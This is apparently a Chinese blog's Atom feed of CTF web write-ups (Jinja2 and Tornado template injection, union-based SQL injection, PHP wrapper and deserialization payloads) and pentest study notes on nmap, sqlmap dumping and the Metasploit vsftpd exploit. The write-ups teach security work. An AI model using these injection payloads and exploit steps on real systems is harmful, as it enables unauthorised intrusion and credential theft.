<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://Ro1ing.github.io</id>
    <title>Ro1ing</title>
    <updated>2021-01-30T06:26:24.041Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://Ro1ing.github.io"/>
    <link rel="self" href="https://Ro1ing.github.io/atom.xml"/>
    <subtitle>To be patient.</subtitle>
    <logo>https://Ro1ing.github.io/images/avatar.png</logo>
    <icon>https://Ro1ing.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Ro1ing</rights>
    <entry>
        <title type="html"><![CDATA[[WesternCTF2018]shrine]]></title>
        <id>https://Ro1ing.github.io/post/westernctf2018shrine/</id>
        <link href="https://Ro1ing.github.io/post/westernctf2018shrine/">
        </link>
        <updated>2021-01-30T06:24:00.000Z</updated>
        <summary type="html"><![CDATA[<pre><code class="language-python">import flask
import os
app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')
@app.route('/')
def index():
    return open(__file__).read()
@app.route('/shrine/&lt;path:shrine&gt;')
def shrine(shrine):
def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
return flask.render_template_string(safe_jinja(shrine))
if __name__ == '__main__':
    app.run(debug=True)
</code></pre>
<p>题目出现这个</p>
<p><strong>flask引擎-jinja2模板注入</strong></p>
<p>利用tplmap这个工具进行检测是否有模板注入漏洞</p>
<pre><code>python tplmap.py -u 
</code></pre>
<p><img src="" alt="" loading="lazy"><img src="https://Ro1ing.github.io/post-images/1611987920309.png" alt="" loading="lazy"></p>
<blockquote>
<p>Automatic Server-Side Template Injection Detection and Expleion tool [checks] Tested parameters appear to be not injectable<br>
翻译：<br>
服务器端模板自动注入检测和删除离子工具！][检查经过测试的参数似乎无法注入</p>
</blockquote>
<p><strong>模板渲染接受的参数需要用两个大括号括起来{ { } }</strong></p>
<p>模板注入也在大括号里构造</p>
<p><img src="https://Ro1ing.github.io/post-images/1611987954881.png" alt="" loading="lazy"><br>
在shrine路径下 ssti注入能运行</p>
<p>回头看下源码</p>
<pre><code>app.config['FLAG'] = os.environ.pop('FLAG')
</code></pre>
<p>注册了一个名为FLAG的config，猜测这就是flag，</p>
<p><strong>如果没有过滤可以直接{{config}}即可查看所有app.config内容</strong></p>
<p>推测{{config}}可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号</p>
<p>不过python还有一些内置函数，比如url_for和get_flashed_messages</p>
<blockquote>
<p>/shrine/{{url_for.<strong>globals</strong>}}</p>
</blockquote>
<p><img src="3.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611987966420.png" alt="" loading="lazy"><br>
current_app-当前app，查看当下app中的config</p>
<p><img src="4.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611987971566.png" alt="" loading="lazy"><br>
得到flag</p>
<p>知识点：</p>
<p><strong>SSTI模板注入：</strong></p>
<p><img src="5.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611987976487.png" alt="" loading="lazy"><br>
模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程</p>
<p>服务端把用户输入的内容渲染成模板就可能造成SSTI(Server-Side Template Injection)</p>
<p>引擎有不同的测试以及注入方式！</p>
]]></summary>
        <content type="html"><![CDATA[<pre><code class="language-python">import flask
import os
app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')
@app.route('/')
def index():
    return open(__file__).read()
@app.route('/shrine/&lt;path:shrine&gt;')
def shrine(shrine):
def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
return flask.render_template_string(safe_jinja(shrine))
if __name__ == '__main__':
    app.run(debug=True)
</code></pre>
<p>题目出现这个</p>
<p><strong>flask引擎-jinja2模板注入</strong></p>
<p>利用tplmap这个工具进行检测是否有模板注入漏洞</p>
<pre><code>python tplmap.py -u 
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://Ro1ing.github.io/post-images/1611987920309.png" alt="" loading="lazy"></figure>
<blockquote>
<p>Automatic Server-Side Template Injection Detection and Expleion tool [checks] Tested parameters appear to be not injectable<br>
翻译：<br>
服务器端模板自动注入检测和删除离子工具！][检查经过测试的参数似乎无法注入</p>
</blockquote>
<p><strong>模板渲染接受的参数需要用两个大括号括起来{ { } }</strong></p>
<p>模板注入也在大括号里构造</p>
<p><img src="https://Ro1ing.github.io/post-images/1611987954881.png" alt="" loading="lazy"><br>
在shrine路径下 ssti注入能运行</p>
<p>回头看下源码</p>
<pre><code>app.config['FLAG'] = os.environ.pop('FLAG')
</code></pre>
<p>注册了一个名为FLAG的config，猜测这就是flag，</p>
<p><strong>如果没有过滤可以直接{{config}}即可查看所有app.config内容</strong></p>
<p>推测{{config}}可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号</p>
<p>不过python还有一些内置函数，比如url_for和get_flashed_messages</p>
<blockquote>
<p>/shrine/{{url_for.<strong>globals</strong>}}</p>
</blockquote>
<p><img src="3.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611987966420.png" alt="" loading="lazy"><br>
current_app-当前app，查看当下app中的config</p>
<p><img src="4.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611987971566.png" alt="" loading="lazy"><br>
得到flag</p>
<p>知识点：</p>
<p><strong>SSTI模板注入：</strong></p>
<p><img src="5.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611987976487.png" alt="" loading="lazy"><br>
模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程</p>
<p>服务端把用户输入的内容渲染成模板就可能造成SSTI(Server-Side Template Injection)</p>
<p>引擎有不同的测试以及注入方式！</p>
<!-- more -->
<blockquote>
<p><strong>flask/jinja2模板注入</strong></p>
<p><strong>PHP/模版引擎Twig注入</strong></p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[护网杯2018]easy_tornado]]></title>
        <id>https://Ro1ing.github.io/post/hu-wang-bei-2018easy_tornado/</id>
        <link href="https://Ro1ing.github.io/post/hu-wang-bei-2018easy_tornado/">
        </link>
        <updated>2021-01-30T06:21:08.000Z</updated>
        <content type="html"><![CDATA[<p>都打开看看</p>
<blockquote>
<p>/flag. txt<br>
flag in/flllllllag</p>
</blockquote>
<blockquote>
<p>/welcome. txt<br>
render</p>
</blockquote>
<blockquote>
<p>/hints. txt<br>
md5(cookie_secret+md5(filename) )</p>
</blockquote>
<p><strong>render()函数详解</strong></p>
<blockquote>
<p>1.<strong>render方法的实质就是生成 itemplate模板</strong><br>
2.通过调用一个方法来生成，而这个方法是通过 render方法的参数传递给它的<br>
3.这个方法有三个参数，分别提供标签名，标签相关属性，标签内部的htm内容<br>
4.通过这三个参数，可以生成一个完整的木模板</p>
<p>tips：</p>
<blockquote>
<p>1、render方法可以使用SX语法，但需要 Babel plugin插件<br>
2、 render方法里的第三个参数可以使用函数来生成多个组件（特别是如果他们相同的话），只要生成结果是一个数组，且数组元素都是vNode即可</p>
</blockquote>
</blockquote>
<p>通过这种方式在网页上显示</p>
<p><strong>render 标志着模板注入</strong></p>
<blockquote>
<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p>
</blockquote>
<p>测试一下</p>
<blockquote>
<p>/error?msg={ {1*2} }</p>
</blockquote>
<p>经过测试发现过滤</p>
<p>payload:</p>
<blockquote>
<p>/error?msg={ {handler.settings} }</p>
</blockquote>
<p>cookie_secret 是handler.application.settings 的 <a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">键值</a><br>
拿到 cookie_secret 解密</p>
<pre><code class="language-python">import hashlib
hash = hashlib.md5()

filename='/fllllllllllllag'
cookie_secret=&quot;8b1de274-3078-4412-a8c4-a6835eeda4a1&quot;
hash.update(filename.encode('utf-8'))
s1=hash.hexdigest()
hash = hashlib.md5()
hash.update((cookie_secret+s1).encode('utf-8'))
print(hash.hexdigest())
</code></pre>
<p>得到flag</p>
<p><strong>拓展</strong>:</p>
<pre><code class="language-python">#生成 Tornado 所需的 cookie_secret 的办法
import base64
import uuid
base64.b64encode(uuid.uuid4().bytes + uuid.uuid4().bytes)
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[极客大挑战 2019]LoveSQL]]></title>
        <id>https://Ro1ing.github.io/post/ji-ke-da-tiao-zhan-2019lovesql/</id>
        <link href="https://Ro1ing.github.io/post/ji-ke-da-tiao-zhan-2019lovesql/">
        </link>
        <updated>2021-01-30T06:20:14.000Z</updated>
        <content type="html"><![CDATA[<p>用户登录界面</p>
<blockquote>
<p>尝试使用万能密码</p>
<pre><code>admin/1'or'1'='1
</code></pre>
</blockquote>
<p>测试单引号' 观察是否有报错信息<br>
这里我就可以知道为 <strong>字符型注入</strong><br>
如果是<strong>整形</strong> 报错信息为“12’”<br>
所以我们要使用到闭合语句来完成</p>
<p>字符型和数字型最大的一个区别在于，数字型<u>不需要单引号来闭合</u>，而字符串<u>一般需要通过单引号来闭合的</u>。</p>
<p>这里使用 <strong>%23</strong> 来闭合</p>
<blockquote>
<p>不知道这里为什么 <u>#</u>  <em>--+</em> 不行</p>
</blockquote>
<p>payload：</p>
<blockquote>
<p>?username=1&amp;password=12' %23<br>
没有报错有回显 NO</p>
</blockquote>
<p>尝试联合注入</p>
<blockquote>
<p>?username=1&amp;password=12' union select 1%23<br>
回显<br>
The used sELECT statements have a different number of columns<br>
提示了我们后面有更多的列数</p>
</blockquote>
<p>添加更多的列</p>
<blockquote>
<p>?username=1&amp;password=12' union select 1,2,3%23</p>
</blockquote>
<p>查询当前数据库名字</p>
<blockquote>
<p>?username=1&amp;password=12' union select 1,database(),3%23</p>
</blockquote>
<p>发现库名geek<br>
在2字段使用group_concat()无效<br>
查询一下3字段</p>
<blockquote>
<p>?username=1&amp;password=12' union select 1, 2, group_concat(table_name)from information_schema.tables where table_schema='geek' %23</p>
</blockquote>
<p>看到<u>geek</u>里面有两个表 再查列</p>
<blockquote>
<p>?username=1&amp;password=12' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' %23<br>
?username=1&amp;password=12' union select 1, 2,<br>
group_concat(password) from lovelysq1 %23</p>
</blockquote>
<p>得到flag<br>
知识点:<br>
<strong>字符型注入</strong><br>
字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ [ZJCTF 2019]NiZhuanSiWei]]></title>
        <id>https://Ro1ing.github.io/post/buuctf-web/</id>
        <link href="https://Ro1ing.github.io/post/buuctf-web/">
        </link>
        <updated>2021-01-30T06:10:35.000Z</updated>
        <content type="html"><![CDATA[<p>代码审计<br>
查看一下useless.php --只有注释信息 没有用<br>
利用data协议绕过<br>
将welcome to the zjctf写入<br>
而data://协议允许读入<br>
payload：</p>
<blockquote>
<p>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</p>
</blockquote>
<p>到这里就不会了 只有看下wp了</p>
<p>正则判断里面是否有flag字符，如果没有的话，并运行指定文件。</p>
<p>利用filter来进行读取指定文件</p>
<p>payload：</p>
<blockquote>
<p>file=php://filter/read=convert.base64-encode/resource=useless.php</p>
</blockquote>
<p>得到 base64解码</p>
<pre><code class="language-php">&lt;?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this-&gt;file)){  
            echo file_get_contents($this-&gt;file); 
            echo &quot;&lt;br&gt;&quot;;
        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
        }  
    }  
}  
?&gt;  
</code></pre>
<p>将flag调用，然后给里面file值赋值为flag.php。<br>
序列化后传入password，应该就会出flag。</p>
<blockquote>
<p>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p>
</blockquote>
<p>三者结合</p>
<p>payload：</p>
<blockquote>
<p>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p>
</blockquote>
<p>得到flag</p>
<p>知识点：</p>
<p><strong>序列号与反序列化</strong>知识：</p>
<p>https://www.jianshu.com/p/631606cc5b76</p>
<p>https://www.cnblogs.com/20175211lyz/p/11403397.html</p>
<table>
<thead>
<tr>
<th style="text-align:center">类型</th>
<th style="text-align:center">结构结构</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">String(字符串)</td>
<td style="text-align:center">s:size:value;</td>
</tr>
<tr>
<td style="text-align:center">Integer(整型)</td>
<td style="text-align:center">i:value;</td>
</tr>
<tr>
<td style="text-align:center">Boolean(布尔型)</td>
<td style="text-align:center">b:value;(保存1或0)</td>
</tr>
<tr>
<td style="text-align:center">Null</td>
<td style="text-align:center">N;</td>
</tr>
<tr>
<td style="text-align:center">Array(列)</td>
<td style="text-align:center">a:size:{key definition;value definition;(repeated per element)}</td>
</tr>
<tr>
<td style="text-align:center">Object</td>
<td style="text-align:center">O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</td>
</tr>
</tbody>
</table>
<p>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p>
<p>例如这里，O代表对象，4为对象长度，1代表有一个成员变量。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[静态网站和动态网站的区别]]></title>
        <id>https://Ro1ing.github.io/post/jing-tai-wang-zhan-he-dong-tai-wang-zhan-de-qu-bie/</id>
        <link href="https://Ro1ing.github.io/post/jing-tai-wang-zhan-he-dong-tai-wang-zhan-de-qu-bie/">
        </link>
        <updated>2021-01-30T06:06:27.000Z</updated>
        <content type="html"><![CDATA[<p><strong>静态网站</strong>：没有进行数据交互的网页，不支持数据传输，页面后缀一般是“.html”。</p>
<blockquote>
<p>静态网站是最初的建站方式，浏览者所看到的每个页面是建站者上传到服务器上的一个 html （ htm ）文件，这种网站每增加、删除、修改一个页面，都必须重新对服务器的文件进行一次下载上传。网页内容一经发布到网站服务器上，无论是否有用户访问，每个静态网页的内容都是保存在网站服务器上的，也就是说，静态网页是实实在在保存在服务器上的文件，每个网页都是一个独立的文件；<br>
静态网页的内容相对稳定，因此容易被搜索引擎检索；<br>
静态网页没有数据库的支持，在网站制作和维护方面工作量较大，因此当网站信息量很大时完全依靠静态网页制作方式比较困难；静态网页的交互性较差，在功能方面有较大的限制。</p>
</blockquote>
<p><strong>动态网站</strong>：支持数据交互的网站</p>
<ol>
<li>交互性：网页会根据用户的要求和选择而动态地改变和响应，浏览器作为客户端，成为一个动态交流的桥梁，动态网页的交互性也是今后 Web 发展的潮流。</li>
<li>自动更新：即无须手动更新 HTML 文档，便会自动生成新页面，可以大大节省工作量。</li>
<li>因时因人而变：即当不同时间、不同用户访问同一网址时会出现不同页面。</li>
</ol>
<figure data-type="image" tabindex="1"><img src="https://Ro1ing.github.io/post-images/1611986854582.png" alt="" loading="lazy"></figure>
<p>最常见的网站是PHP和Java语言做的网站了，PHP开发速度快于Java，PHP能够快速的搭建环境，以及编辑一个页面。</p>
<p>静态网站是指全部由HTML（标准通用标记语言的子集）代码格式页面组成的网站，所有的内容包含在网页文件中。网页上也可以出现各种视觉动态效果，如GIF动画，FLASH动画，滚动字幕等，而网站主要是静态化的页面和代码组成，一般文件名均以htm，html，shtml等为后缀。</p>
<p><em>注意HTML是标记语言而非编程语言</em></p>
<ul>
<li><strong>关于标记语言与编程语言</strong></li>
</ul>
<blockquote>
<p>标记语言，是一种将文本（Text）以及文本相关的其他信息结合起来，展现出关于文档结构和数据处理细节的电脑文字编码。与文本相关的其他信息（包括例如文本的结构和表示信息等）与原来的文本结合在一起，但是使用标记（markup）进行标识。<br>
编译型语言：程序在执行之前需要一个专门的编译过程，把程序编译成 为机器语言的文件，运行时不需要重新翻译，直接使用编译的结果就行了。程序执行效率高，依赖编译器，跨平台性差些，标记语言不用于向计算机发出指令，常用于格式化和链接。<br>
编译型语言写的程序执行之前，需要一个专门的编译过程，把程序编译成为机器语言的文件，比如exe文件，以后要运行的话就不用重新翻译了，直接使用编译的结果就行了（exe文件），因为翻译只做了一次，运行时不需要翻译，所以编译型语言的程序执行效率高。<br>
两者最简单的区别在于，编程语言有逻辑和行为能力，而标记语言没有。<br>
静态网站的安全性是要比动态网站更高的，因为静态网站本身没有与服务器的数据交互。</p>
</blockquote>
<p>动态网站并不是指具有动画功能的网站，而是指网站内容可根据不用情况动态变更的网站，一般情况下动态网站通过数据库进行架构，动态网站除了要设计网页外，还要童工数据库和编程序来使网站具有更多自动的和高级的功能。动态网站体现在网页一般是以asp，jsp，php，aspx等结束，而静态网页一般是以HTML（标准通用标记语言的子集）结尾，动态网站服务器空间配置要比静态的网页要求高，费用也相应的高，不过动态网页利于网站内容的更新，适合企业建站，动态是相对于静态而言。由动态的脚本编写，需要后台数据库支持。</p>
<ul>
<li><strong>静态与动态的区别</strong></li>
</ul>
<blockquote>
<p>静态网站用于发布，比如发布一些文章，他不需要用户进行注册；动态则像是论坛，或者淘宝之类，有着大量数据流通的网站，我们判断一个网站属于静态还是动态，就直接在网站后面看他是什么结尾的就好了</p>
<p>那么结尾没有显示脚本语言子集怎么办呢</p>
<p>我们可以在网址后面，加上一个指令：index<express></p>
<p>比如index.html，如果没有报错，那么我们就可以证明这就是一个html网站</p>
<p>基于这个方法我们甚至可以判断这个网站是windows系统还是linux系统，这里使用的是linux系统对大小写敏感的问题</p>
<p>比如你对一个html网站跟上index.Html，这个时候如果没报错，就是windows系统，如果报错，就是linux系统，因为Html这个写法linux无法识别</p>
</blockquote>
<blockquote>
<p>那么还有一种情况，伪静态<br>
对于有些网站，你删除网址最后的html，或者改成php，或者一些其他的“在网址上让其不从属于静态网站”的操作时，他不会报错，依然可以正常显示网页内容，这样的网站就是伪静态网站。<br>
伪静态是相对真实静态来讲的，通常我们为了增强<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/104812">搜索引擎</a>的友好面，都将文章内容生成静态页面，但是有的朋友为了实时的显示一些信息。或者还想运用动态脚本解决一些问题。不能用静态的方式来展示网站内容。但是这就损失了对搜索引擎的友好面。怎么样在两者之间找个中间方法呢，这就产生了伪静态技术。就是展示出来的是以html一类的静态页面形式，但其实是用ASP一类的动态脚本来处理的</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[渗透基础学习笔记]]></title>
        <id>https://Ro1ing.github.io/post/shen-tou-ji-chu-xue-xi-bi-ji/</id>
        <link href="https://Ro1ing.github.io/post/shen-tou-ji-chu-xue-xi-bi-ji/">
        </link>
        <updated>2021-01-30T05:27:06.000Z</updated>
        <content type="html"><![CDATA[<h1 id="主机发现学习笔记一">主机发现学习笔记(一)</h1>
<p>首先先要了解协议中的<u>栈分层</u><br>
<strong>OSI</strong>     （Open System Interconnect），即开放式系统互联。</p>
<blockquote>
<p>应用层：给应用提供服务。<br>
表示层：确保从设备的应用层发出的数据可以被另一个设备应用层理解，把文件转换成bit流。<br>
会话层：建立、管理、终止表示层实体和传输层间的通信会话。<br>
传输层：流控、检错、纠错和端到端通信。<br>
网络层：tcp/ip的实现、路由功能。<br>
数据链路层：控制物理层的协议。<br>
物理层：电器和机械方面。</p>
<p><strong>TCP/IP</strong><br>
应用层：是网络应用程序及其应用层协议存留的层次。该层包括了所有与网络相关的高层协议，如文件传输协议（FTP）、超文本传输协议（HTTP）、远程终端协议（Telent)、简单邮件传送协议（SMTP)、因特网中继聊天（IRC)等。<br>
传输层：使源端主机和目标端主机上的对等实体可以进行会话。该层有两种服务质量不同的协议：传输控制协议（TCP）和用户数据报协议（UDP）。<br>
互联网层：通过路径选择把分组发往目标网络或主机，进行网络拥塞控制以及差错控制，是整个TCP/IP协议栈的核心。<br>
网络访问层：负责网络层和物理层之间的通信，将网络层接收到的数据分割成特定的可被物理层传输的帧，并让物理层进行实际的数据传送。</p>
</blockquote>
<h2 id="二层主机发现">二层主机发现</h2>
<p>二层主机发现指：利用ISO中链路层中的协议进行主机发现。一般使用<strong>ARP</strong>协议。<br>
优点：（局域网中通信使用ARP协议，利用MAC地址作为对应的识别地址）<br>
1、速度快<br>
2、可靠性高<br>
缺点：<br>
无法扫描经过路由的主机</p>
<h3 id="扫描工具">扫描工具</h3>
<p><strong>arping</strong></p>
<blockquote>
<p>Kali自带；<br>
缺点：只能对单个主机多次扫描。<br>
<strong>netdiscover</strong><br>
Kali自带；<br>
针对特定的子网进行多主机。</p>
</blockquote>
<h2 id="三层主机发现">三层主机发现</h2>
<p>三层主机发现指：利用ISO中网络中的协议进行主机发现。一般使用<strong>ICMP</strong>协议。<br>
优点：<br>
1、可以发现远程主机 经过路由的主机<br>
2、速度相对比较快<br>
缺点：<br>
1、经常被防火墙过滤<br>
2、速度相比二层发现慢</p>
<h3 id="扫描工具-2">扫描工具</h3>
<p><strong>ping</strong></p>
<blockquote>
<p>ping IP地址<br>
Linux和windows都有自带，<br>
Linux下ping如果不指定-c参数，一直扫描。Windows下默认进行四次探测。<br>
<strong>fping</strong><br>
fping -g IP地址/端口号<br>
Kali自带;<br>
可以针对多个主机同时进行主机发现。<br>
<strong>hping3</strong><br>
hping3 -h //修改ICMP相关指令<br>
hping3 -c 扫描次数 --icmp IP地址<br>
Kali自带；<br>
可以发送自定义 ICMP数据包 。</p>
</blockquote>
<h2 id="四层主机发现">四层主机发现</h2>
<p>四层发现指利用OSI中的传输层协议进行主机发现，一般使用<strong>TCP、UDP</strong>探测。<br>
优点：<br>
1、可探测远程主机<br>
2、比三层发现更为可靠<br>
缺点：<br>
花费时间更长</p>
<h3 id="扫描工具-3">扫描工具</h3>
<p><strong>nmap</strong></p>
<blockquote>
<p>nmap IP地址<br>
Kali自带；<br>
可以进行二、三、四层的探测 。<br>
<strong>hping3</strong><br>
hping3 --udp -c 3 -p端口号 IP地址<br>
//--udp	使用udp进行探测	-c 使用3次	默认端口为零	浏览器默认端口为80<br>
Kali自带；<br>
可以进行对应的四层层主机发现。<br>
Python脚本-<strong>nWatch</strong><br>
安装：pip install python-nmap</p>
</blockquote>
<h1 id="漏洞扫描学习笔记一">漏洞扫描学习笔记(一)</h1>
<h2 id="漏洞扫描原理"><strong>漏洞扫描原理</strong></h2>
<p>漏洞扫描器对漏洞进行扫描，以验证具体目标是否存在对应的具体漏洞。但是也存在错误扫描，需要对扫描结果进行漏洞验证。</p>
<p>其实扫描器的原理大致相同都是通过发送对应的验证数据到目标具体服务进行验证。当收到目标返回的响应与存在漏洞的响应一致时，就表明存在漏洞。</p>
<h3 id="漏洞扫描工具">漏洞扫描工具</h3>
<p><strong>Nmap</strong></p>
<blockquote>
<p>nmap --script vuln 目标IP地址<br>
<strong>Nessus</strong> 系统漏洞扫描<br>
**Metasploit **对扫描到的漏洞加以利用<br>
以vsftpd2.3.4为例<br>
search vsftpd<br>
得到<br>
use (复制粘贴上面的路径)<br>
show payloads<br>
set payload <u>cmd/unix/interact</u> //上面展示的路径<br>
show options 设置所用的参数<br>
set rhost（上面name下面的） ip<br>
show options 观察是否设置成功<br>
exploit  溢出<br>
得到shell</p>
</blockquote>
<h2 id="web应用程序漏洞扫描">web应用程序漏洞扫描</h2>
<p>针对web应用程序的漏洞扫描其实就是每个扫描器读取自己的payload进行探测</p>
<blockquote>
<p>常见Web漏洞扫描器：<br>
1.Owasp-zap<br>
2.awvs<br>
3.appscan<br>
4.nikto<br>
5.Burpsuite<br>
每个扫描器都有各自不同的payload探测<br>
<strong>Woasp-zap</strong><br>
kali自带<br>
直接输入url攻击即可<br>
<strong>Nikto</strong><br>
nikto -host IP地址<br>
对目标服务器进行漏洞扫描 主要针对HTTP服务器</p>
</blockquote>
<h3 id="漏洞利用">漏洞利用</h3>
<p><strong>Sqlmap</strong> 对扫描到的sql注入漏洞进行利用</p>
<blockquote>
<p>在owasp-zap 扫到的sql漏洞复制出<br>
在浏览器里粘贴<br>
修改不为sql报错信息<br>
然后在终端内<br>
sqlmap -u &quot;url&quot;<br>
sqlmap -u &quot;url&quot; -T admin --columns<br>
sqlmap -u &quot;url&quot; -T admin -C &quot;admin,passwprd&quot; --dump获取对应数据<br>
然后密文解密<br>
得到shell</p>
</blockquote>
<h1 id="端口扫描学习笔记一">端口扫描学习笔记(一)</h1>
<h2 id="端口的基本介绍">端口的基本介绍</h2>
<p>&quot;<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3">端口</a>&quot;是英文port的意译，可以认为是<a href="https://baike.baidu.com/item/%E8%AE%BE%E5%A4%87/3794003">设备</a>与外界通讯交流的出口。端口可分为虚拟端口和物理端口，其中<a href="https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F/10866735">虚拟</a>端口指计算机内部或交换机路由器内的端口，不可见。例如计算机中的80端口、21端口、23端口等。物理端口又称为接口，是可见端口，计算机背板的RJ45网口，交换机路由器集线器等RJ45端口。电话使用RJ11插口也属于物理端口的范畴。</p>
<p>一台拥有IP地址的主机可以提供许多服务，比如：</p>
<p><a href="https://baike.baidu.com/item/Web%E6%9C%8D%E5%8A%A1">Web服务</a>、FTP服务、SMTP服务等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎样区分不同的<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1">网络服务</a>呢？显然不能只靠IP地址，因为IP 地址与网络服务的关系是一对多的关系。实际上是通过“IP地址+端口号”来区分不同的服务的。因此 ，一个开放的端口代表一个提供的服务，不同的服务具有不同的端口号，因此要对此服务进行测试，首先要确定是否开放对应端口号。</p>
<h2 id="端口扫描工具">端口扫描工具</h2>
<p><strong>Nmap</strong></p>
<blockquote>
<p>nmap IP地址</p>
</blockquote>
<p><strong>Dmitry</strong></p>
<blockquote>
<p>其中-p参数指定dmitry进行tcp端口扫描。</p>
<p>dmitry -p IP地址</p>
<p>相对 nmap 扫描端口较少，因为只会扫描常用端口</p>
</blockquote>
<p><strong>netcat</strong></p>
<blockquote>
<p>-nc -nvz ip地址 端口范围</p>
<p>例 ： -nc -nvz 192.168.xxx.xxx 20-30</p>
<p>端口的分类：</p>
<p>端口号的范围是从1～65535 //2的16次方</p>
</blockquote>
<h2 id="端口分类">端口分类</h2>
<p>端口范围 <strong>0-65535</strong></p>
<p><strong>TCP端口</strong>和<strong>UDP端口</strong>。<u>由于TCP和UDP 两个协议是独立的，因此各自的端口号也相互独立</u>，比如TCP有235端口，UDP也 可以有235端口，两者并不冲突。</p>
<p>端口分为：</p>
<p>1、<u>周知端口</u></p>
<p>周知端口是众所周知的端口号，范围从0到1023，其中80端口分配给WWW服务，21端口分配给FTP服务等。我们在IE的地址栏里输入一个网址的时候是不必指定端口号的，因为在默认情况下WWW服务的端口是“80”。它们紧密绑定于一些服务，通常这些端口的通讯明确表明了某种服务的协议，如：80端口对应与HTTP通信，21端口绑定与FTP服务，25端口绑定于SMTP服务，135端口绑定与RPC（远程过程调用）服务。</p>
<p>2、<u>动态端口</u></p>
<p>动态端口的范围是从49152到65535。之所以称为动态端口，是因为它 一般不固定分配某种服务，而是动态分配。理论上，不应为服务分配这些端口，通常机器从1024开始分配动态端口。例外：SUN的RPC端口从32768开始。</p>
<p>可能会被木马攻击，等待端口的分配</p>
<p>3、<u>注册端口</u></p>
<p>端口1024到49151，分配给用户进程或应用程序。这些进程主要是用户安装的程序。它们松散的绑定于一些服务，也就是说有许多服务绑定于这些端口，这些端口同样用于其他许多目的，如：许多系统处理端口从1024开始</p>
<h3 id="获取端口banner信息工具">获取端口Banner信息工具</h3>
<p><strong>Nmap</strong>扫描指定主机的端口信息，并<u>返回Banner</u></p>
<blockquote>
<p>nmap IP地址 -p 端口号 --script banner</p>
</blockquote>
<p><strong>Dmitry</strong> 获取端口信息</p>
<blockquote>
<p>dmitry -pb IP地址</p>
</blockquote>
<p><strong>Netcat</strong> 获取banner信息</p>
<blockquote>
<p>nc -vn IP地址 端口号</p>
</blockquote>
<p><strong>Nmap</strong><u>获取目标系统的端口版本信息</u></p>
<blockquote>
<p>nmap -p 端口号 -sV IP地址</p>
</blockquote>
<p><strong>Nmap</strong>扫描指定<u>主机的操作系统版本</u></p>
<blockquote>
<p>nmap -O IP地址</p>
</blockquote>
<h1 id="http协议学习笔记一">Http协议学习笔记(一)</h1>
<h4 id="什么是http">什么是HTTP？</h4>
<p>​    互联网应用最广泛的一种网络协议，所有<u>www文件</u>必须遵守这个标准，设计最初目的是为了提供一种发布和接受<u>HTML</u>页面的方法。</p>
<blockquote>
<p>超文本传输协议，是一个基于请求与响应，无状态的，应用层的协议，常基于TCP/IP协议传输数据，互联网上应用最为广泛的一种网络协议,所有的WWW文件都必须遵守这个标准。设计HTTP的初衷是为了提供一种发布和接收HTML页面的方法。</p>
</blockquote>
<p>HTTP由两部分组成：<strong>请求</strong>和<strong>响应</strong>。当你在Web浏览器中输入一个URL时，浏览器将根据你的要求创建并发送请求，该请求包含所输入的URL以及一些与浏览器本身相关的信息。当服务器收到这个请求时将返回一个响应，该响应包括与该请求相关的信息以及位于指定URL（如果有的话）的数据。直到浏览器解析该响应并显示出网页（或其他资源）为止。</p>
<p>常见的请求头：</p>
<blockquote>
